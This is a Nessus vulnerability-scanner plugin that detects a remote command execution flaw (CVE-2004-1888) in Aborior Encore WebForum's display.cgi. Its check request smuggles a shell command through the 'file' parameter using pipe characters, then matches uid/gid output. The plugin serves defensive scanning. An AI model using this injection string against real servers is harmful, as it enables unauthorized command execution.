#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(12127);
 script_cve_id("CVE-2004-1888");
 script_bugtraq_id(10040);
 script_xref(name:"OSVDB", value:"16831");
 script_version ("$Revision: 1.12 $");
 
 script_name(english:"Aborior Encore WebForum display.cgi file Variable Command Execution");
 script_summary(english:"Detects display.cgi");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a web forum that is affected by a
remote command execution vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running the Aborior Web Forum.

There is a flaw in this version which may allow an attacker to execute
arbitrary commands on this server with the privileges of the affected
web server." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2004-04/0007.html" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
 script_end_attributes();
  script_category(ACT_ATTACK);
 
  script_copyright(english:"This script is Copyright (C) 2004-2009 Tenable Network Security, Inc.");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

http_check_remote_code (
			check_request:"/display.cgi?preftemp=temp&page=anonymous&file=|id|",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id"
			);
